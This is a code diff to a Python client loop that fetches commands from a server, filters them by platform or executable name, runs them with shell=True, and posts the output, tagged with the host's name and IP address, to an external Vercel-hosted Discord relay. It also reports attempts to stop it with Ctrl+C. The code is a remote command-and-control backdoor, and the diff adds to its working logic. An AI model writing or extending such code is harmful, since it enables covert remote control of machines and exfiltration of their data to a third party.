@@ -43,7 +43,8 @@ while True:
             print("Failed to connect to server")
             sleep(3)
             continue
-            # execute command
+        # execute command
+        localcmd = None
         if old_command != command:
             try:
                 if command.startswith("exename "):
@@ -55,10 +56,10 @@ while True:
                         old_command = command
                         continue
                 if command.startswith("exeos "):
-                    command = command.split()
-                    if command[1] == platform:
-                        del command[:2]
-                        command = ' '.join(command)
+                    localcmd = command.split()
+                    if localcmd[1] == platform:
+                        del localcmd[:2]
+                        localcmd = ' '.join(localcmd)
                     else:
                         old_command = command
                         continue
@@ -89,7 +90,10 @@ while True:
                 global sperror
                 sperror = None
                 try:
-                    cmdout = system(command, shell=True).decode()
+                    if localcmd:
+                        cmdout = system(localcmd, shell=True).decode()
+                    else:
+                        cmdout = system(command, shell=True).decode()
                 except CalledProcessError as e:
                     try:
                         sperror=True
@@ -119,7 +123,10 @@ while True:
                 if not sperror:
                     if cmdout != "":
                         try:
-                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```{cmdout}```- {ip}@{hostname}")
+                            if localcmd:
+                                 post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```{cmdout}```")
+                            else:
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```{cmdout}```")
                         except KeyboardInterrupt:
                             try:
                                 post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
